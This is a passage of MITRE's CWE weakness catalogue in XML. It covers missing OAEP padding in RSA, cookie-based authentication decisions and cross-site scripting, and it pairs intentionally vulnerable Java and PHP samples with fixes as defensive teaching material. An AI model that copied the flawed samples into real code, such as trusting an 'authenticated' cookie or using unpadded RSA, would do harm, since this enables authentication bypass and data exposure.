               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings, White_Box_Definitions</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-12-10</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">OS Command Injection</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Failure to Sanitize Data into an OS Command (aka 'OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Failure to Preserve OS Command Structure (aka 'OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-07-27">Failure to Preserve OS Command Structure ('OS Command Injection')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-06-21">Improper Sanitization of Special Elements used in an OS Command ('OS Command Injection')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="780" Name="Use of RSA Algorithm without OAEP" Abstraction="Variant" Structure="Simple" Status="Incomplete">
         <Description>The product uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.</Description>
         <Extended_Description>Padding schemes are often used with cryptographic algorithms to make the plaintext less predictable and complicate attack efforts. The OAEP scheme is often used with RSA to nullify the impact of predictable common text.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="327" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Medium</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Without OAEP in RSA encryption, it will take less work for an attacker to decrypt the data or to infer patterns from the ciphertext.</Note>
            </Consequence>
         </Common_Consequences>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The example below attempts to build an RSA cipher.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public Cipher getRSACipher() {<xhtml:div style="margin-left:1em;">Cipher rsa = null;<xhtml:br/>try {<xhtml:div style="margin-left:1em;">rsa = javax.crypto.Cipher.getInstance("RSA/NONE/NoPadding");</xhtml:div>}<xhtml:br/>catch (java.security.NoSuchAlgorithmException e) {<xhtml:div style="margin-left:1em;">log("this should never happen", e);</xhtml:div>}<xhtml:br/>catch (javax.crypto.NoSuchPaddingException e) {<xhtml:div style="margin-left:1em;">log("this should never happen", e);</xhtml:div>}<xhtml:br/>return rsa;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>While the previous code successfully creates an RSA cipher, the cipher does not use padding. The following code creates an RSA cipher using OAEP.</Body_Text>
               <Example_Code Nature="Good" Language="Java">
                  <xhtml:div>public Cipher getRSACipher() {<xhtml:div style="margin-left:1em;">Cipher rsa = null;<xhtml:br/>try {<xhtml:div style="margin-left:1em;">rsa = javax.crypto.Cipher.getInstance("RSA/ECB/OAEPWithMD5AndMGF1Padding");</xhtml:div>}<xhtml:br/>catch (java.security.NoSuchAlgorithmException e) {<xhtml:div style="margin-left:1em;">log("this should never happen", e);</xhtml:div>}<xhtml:br/>catch (javax.crypto.NoSuchPaddingException e) {<xhtml:div style="margin-left:1em;">log("this should never happen", e);</xhtml:div>}<xhtml:br/>return rsa;</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <References>
            <Reference External_Reference_ID="REF-694"/>
            <Reference External_Reference_ID="REF-695"/>
         </References>
         <Notes>
            <Note Type="Maintenance">This entry could probably have a new parent related to improper padding, however the role of padding in cryptographic algorithms can vary, such as hiding the length of the plaintext and providing additional random bits for the cipher. In general, cryptographic problems in CWE are not well organized and further research is needed.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Organization>Fortify Software</Submission_Organization>
               <Submission_Date>2009-07-08</Submission_Date>
               <Submission_Comment>Based on information from Fortify Software.</Submission_Comment>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="784" Name="Reliance on Cookies without Validation and Integrity Checking in a Security Decision" Abstraction="Variant" Structure="Simple" Status="Draft">
         <Description>The product uses a protection mechanism that relies on the existence or values of a cookie, but it does not properly ensure that the cookie is valid for the associated user.</Description>
         <Extended_Description>Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Attackers can bypass protection mechanisms such as authorization and authentication by modifying the cookie to contain an expected value.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="807" View_ID="1000"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="565" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to claim a high level of authorization, or to claim that successful authentication has occurred.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Avoid using cookie data for a security-related decision.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Perform thorough input validation (i.e.: server side validation) on the cookie data if you're going to use it for a security related decision.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Add integrity checks to detect tampering.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Protect critical cookies from replay attacks, since cross-site scripting or other attacks may allow attackers to steal a strongly-encrypted cookie that also passes integrity checks. This mitigation applies to cookies that should only be valid during a single transaction or session. By enforcing timeouts, you may limit the scope of an attack. As part of your integrity check, use an unpredictable, server-side value that is not exposed to the client.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-15">
               <Intro_Text>The following code excerpt reads a value from a browser cookie to determine the role of the user.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:1em;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("role")) {<xhtml:div style="margin-left:1em;">userRole = c.getValue();</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-16">
               <Intro_Text>The following code could be for a medical records application. It performs authentication by checking if a cookie has been set.</Intro_Text>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>$auth = $_COOKIES['authenticated'];<xhtml:br/>if (! $auth) {<xhtml:div style="margin-left:1em;">if (AuthenticateUser($_POST['user'], $_POST['password']) == "success") {<xhtml:div style="margin-left:1em;">// save the cookie to send out in future responses<xhtml:br/>setcookie("authenticated", "1", time()+60*60*2);</xhtml:div>}<xhtml:br/>else {<xhtml:div style="margin-left:1em;">ShowLoginScreen();<xhtml:br/>die("\n");</xhtml:div>}</xhtml:div>}<xhtml:br/>DisplayMedicalHistory($_POST['patient_ID']);</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer expects that the AuthenticateUser() check will always be applied, and the "authenticated" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie.</Body_Text>
               <Body_Text>However, the attacker can set the "authenticated" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-17">
               <Intro_Text>In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cookie[] cookies = request.getCookies();<xhtml:br/>for (int i =0; i&lt; cookies.length; i++) {<xhtml:div style="margin-left:1em;">Cookie c = cookies[i];<xhtml:br/>if (c.getName().equals("authenticated") &amp;&amp; Boolean.TRUE.equals(c.getValue())) {<xhtml:div style="margin-left:1em;">authenticated = true;</xhtml:div>}</xhtml:div>}</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2009-1549</Reference>
               <Description>Attacker can bypass authentication by setting a cookie to a specific value.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1549</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1619</Reference>
               <Description>Attacker can bypass authentication and gain admin privileges by setting an "admin" cookie to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1619</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0864</Reference>
               <Description>Content management system allows admin privileges by setting a "login" cookie to "OK."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0864</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5784</Reference>
               <Description>e-dating application allows admin privileges by setting the admin cookie to 1.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5784</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-6291</Reference>
               <Description>Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to "admin."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-6291</Link>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference External_Reference_ID="REF-706"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 13, &#34;Sensitive Data in Cookies and Fields&#34; Page 435"/>
         </References>
         <Notes>
            <Note Type="Maintenance">A new parent might need to be defined for this entry. This entry is specific to cookies, which reflects the significant number of vulnerabilities being reported for cookie-based authentication in CVE during 2008 and 2009. However, other types of inputs - such as parameters or headers - could also be used for similar authentication or authorization. Similar issues (under the Research view) include CWE-247 and CWE-472.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CWE Content Team</Submission_Name>
               <Submission_Organization>MITRE</Submission_Organization>
               <Submission_Date>2009-07-16</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
         </Content_History>
      </Weakness>
      <Weakness ID="79" Name="Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.</Description>
         <Extended_Description>
            <xhtml:p>Cross-site scripting (XSS) vulnerabilities occur when:</xhtml:p>
            <xhtml:ol>
               <xhtml:li>Untrusted data enters a web application, typically from a web request.</xhtml:li>
               <xhtml:li>The web application dynamically generates a web page that contains this untrusted data.</xhtml:li>
               <xhtml:li>During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.</xhtml:li>
               <xhtml:li>A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.</xhtml:li>
               <xhtml:li>Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.</xhtml:li>
               <xhtml:li>This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.</xhtml:li>
            </xhtml:ol>
            <xhtml:p>There are three main kinds of XSS:</xhtml:p>
            <xhtml:ul>
               <xhtml:li>
                  <xhtml:b>Type 1: Reflected XSS (or Non-Persistent)</xhtml:b> - 
         			The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.</xhtml:li>
               <xhtml:li>
                  <xhtml:b>Type 2: Stored XSS (or Persistent)</xhtml:b> - 
               The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.
            </xhtml:li>
               <xhtml:li>
                  <xhtml:b>Type 0: DOM-Based XSS</xhtml:b> - 
               In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.
            </xhtml:li>
            </xhtml:ul>
            <xhtml:p>Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."</xhtml:p>
            <xhtml:p>In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="74" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="494" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="352" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
            <Technology Class="Web Based" Prevalence="Often"/>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <xhtml:p>The Same Origin Policy states that browsers should limit the resources accessible to scripts running on a given web site, or "origin", to the resources associated with that web site on the client-side, and not the client-side resources of any other sites or "origins". The goal is to prevent one site from being able to modify or read the contents of an unrelated site. Since the World Wide Web involves interactions between many sites, this policy is important for browsers to enforce.</xhtml:p>
               <xhtml:p>When referring to XSS, the Domain of a website is roughly equivalent to the resources associated with that website on the client-side of the connection. That is, the domain can be thought of as all resources the browser is storing for the user's interactions with this particular site.</xhtml:p>
            </Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>XSS</Term>
               <Description>A common abbreviation for Cross-Site Scripting.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>HTML Injection</Term>
               <Description>Used as a synonym of stored (Type 2) XSS.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>CSS</Term>
               <Description>In the early years after initial discovery of XSS, "CSS" was a commonly-used acronym.  However, this would cause confusion with "Cascading Style Sheets," so usage of this acronym has declined significantly.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The most common attack performed with cross-site scripting involves the disclosure of information stored in user cookies. Typically, a malicious user will craft a client-side script, which -- when parsed by a web browser -- performs some activity (such as sending all site cookies to a given E-mail address). This script will be loaded and run by each user visiting the web site. Since the site requesting to run the script has access to the cookies in question, the malicious script does also.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>In some circumstances it may be possible to run arbitrary code on a victim's computer when cross-site scripting is combined with other flaws.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Scope>Integrity</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Note>The consequence of an XSS attack is the same regardless of whether it is stored or reflected. The difference is in how the payload arrives at the server. XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. Some cross-site scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on the end user systems for a variety of nefarious purposes. Other damaging attacks include the disclosure of end user files, installation of Trojan horse programs, redirecting the user to some other page or site, running "Active X" controls (under Microsoft Internet Explorer) from sites that a user perceives as trustworthy, and modifying presentation of content.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Use automated static analysis tools that target this type of weakness. Many modern techniques use data flow analysis to minimize the number of false positives. This is not a perfect solution, since 100% accuracy and coverage are not feasible, especially when multiple components are involved.</Description>
               <Effectiveness>Moderate</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Use the XSS Cheat Sheet [REF-714] or automated test-generation tools to help launch a wide variety of attacks against your web application. The Cheat Sheet contains many subtle XSS variations that are specifically targeted against weak XSS defenses.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>With Stored XSS, the indirection caused by the data store can make it more difficult to find the problem. The tester must first inject the XSS string into the data store, then find the appropriate application functionality in which the XSS string is sent to other users of the application. These are two distinct steps in which the activation of the XSS can take place minutes, hours, or days after the XSS was originally injected into the data store.</Effectiveness_Notes>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Examples of libraries and frameworks that make it easier to generate properly encoded output include Microsoft's Anti-XSS library, the OWASP ESAPI Encoding module, and Apache Wicket.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>
                  <xhtml:p>Understand the context in which your data will be used and the encoding that will be expected. This is especially important when transmitting data between different components, or when generating outputs that can contain multiple encodings at the same time, such as web pages or multi-part mail messages. Study all expected communication protocols and data representations to determine the required encoding strategies.</xhtml:p>
                  <xhtml:p>For any data that will be output to another web page, especially any data that was received from external inputs, use the appropriate encoding on all non-alphanumeric characters.</xhtml:p>
                  <xhtml:p>Parts of the same output document may require different encodings, which will vary depending on whether the output is in the:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>HTML body</xhtml:li>
                        <xhtml:li>Element attributes (such as src="XYZ")</xhtml:li>
                        <xhtml:li>URIs</xhtml:li>
                        <xhtml:li>JavaScript sections</xhtml:li>
                        <xhtml:li>Cascading Style Sheets and style property</xhtml:li>
                     </xhtml:ul>
                  <xhtml:p>etc. Note that HTML Entity Encoding is only appropriate for the HTML body.</xhtml:p>
                  <xhtml:p>Consult the XSS Prevention Cheat Sheet [REF-724] for more details on the types of encoding and escaping that are needed.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-6">
               <Phase>Architecture and Design</Phase>
               <Phase>Implementation</Phase>
               <Strategy>Attack Surface Reduction</Strategy>
               <Description>Understand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.</Description>
               <Effectiveness>Limited</Effectiveness>
               <Effectiveness_Notes>This technique has limited effectiveness, but can be helpful when it is possible to store client state and sensitive information on the server side instead of in cookies, headers, hidden form fields, etc.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Phase>Architecture and Design</Phase>
               <Description>For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Phase>Architecture and Design</Phase>
               <Strategy>Parameterization</Strategy>
               <Description>If available, use structured mechanisms that automatically enforce the separation between data and code. These mechanisms may be able to provide the relevant quoting, encoding, and validation automatically, instead of relying on the developer to provide this capability at every point where output is generated.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-30.1">
               <Phase>Implementation</Phase>
               <Strategy>Output Encoding</Strategy>
               <Description>
                  <xhtml:p>Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.</xhtml:p>
